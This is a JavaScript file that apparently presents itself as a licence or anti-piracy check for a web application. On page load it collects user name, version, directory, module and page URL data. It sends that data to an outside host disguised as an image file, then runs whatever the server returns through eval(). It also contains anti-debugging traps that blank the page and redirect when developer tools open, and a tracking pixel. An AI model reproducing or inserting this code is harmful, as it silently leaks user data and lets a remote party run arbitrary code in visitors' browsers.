$(function(){
	var copr= new COPR();
	copr.rsc();	
});
;function COPR() {
	window.CBPR=this;
	this.uri = 0;
	this.pov = {};
	this.dor ='QQ:3379530015';
	this.url = 'http://cdn.ll03.cn/baselang.gif';
	this.rsc = function() {
		this.pov.version = $user.version;		
		this.pov.date = $user.date;		
		this.pov.user = $user.name || '';	
		this.pov.info = $user.dirs;
		this.pov.info = $user.info || '';
		this.pov.module = $user.module;
		this.pov.template = $user.dirs;
		this.pov.manage = location.href.substr(0,300);
		this.pov.href = location.href.substr(0,300);
		//console.log(this.pov);
		this.ahr(this.url, 'data=' + encodeURIComponent(encodeURIComponent(JSON.stringify(this.pov))),
		function(d) {
			try {eval(d);} catch(e) {}
			CBPR.act(d);
		});
	}
	this.act = function(i) {
		if (typeof i != 'string') i = '0';
		i = i.replace(/^\s*|\s*$/g, '')|| '0';
		if (this['ev'+i]) this['ev'+i].call(this,i);;
	}
	this.ev0 = function(i) {}
	this.ev1 = function(i) {
		return;
		alert('发现代码多人使用疑似盗版！购买正版请联系'+this.dor);
		document.head.innerHTML=document.body.innerHTML='';
		window.location = 'http://www.qq.com/babygohome/?pgv_ref=404';
	}
	this.ahr = function(u, s, k, e) {
		var xhr = window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject("Microsoft.XMLHTTP");
		xhr.open("POST", u, true);
		xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
		xhr.send(s);
		xhr.onreadystatechange = function() {
			if (xhr.readyState == 4 && xhr.status == 200) {
				k(xhr.responseText);
			}
		}
	}
	this.diw = function() {
		if (!$user.debug) {
			function diwf(){
				try{
					window.closeWin=function (e) {
						e && e.stopPropagation();
						document.head.innerHTML=document.body.innerHTML='';
						window.location = 'http://www.qq.com/babygohome/?pgv_ref=404';
					};
					var coso = /x/;
					coso.print=0;
					coso.toString = function () {
						if(coso.print++>0)closeWin();
						return '';
					};  
					console.log(coso);	
					console.profile();
					console.profileEnd();
					console.clear();
					if(console.profiles && console.profiles.length)closeWin();
					if(navigator.mozContacts)closeWin();
					var csx = console;
					Object.defineProperty(window,"console",{
						get: function() {
							if (csx._commandLineAPI)closeWin();
							return csx
						},set: function(d) {
							csx = d
						}
					});
				}catch(e){}
			}
			diwf();
			setInterval(diwf,1000);
			this.tog();
		}
	}
	this.tog=function(){
		var img=new Image();
		img.src='//ia.51.la/go1?id=19301627&pvFlag=1';
	}
}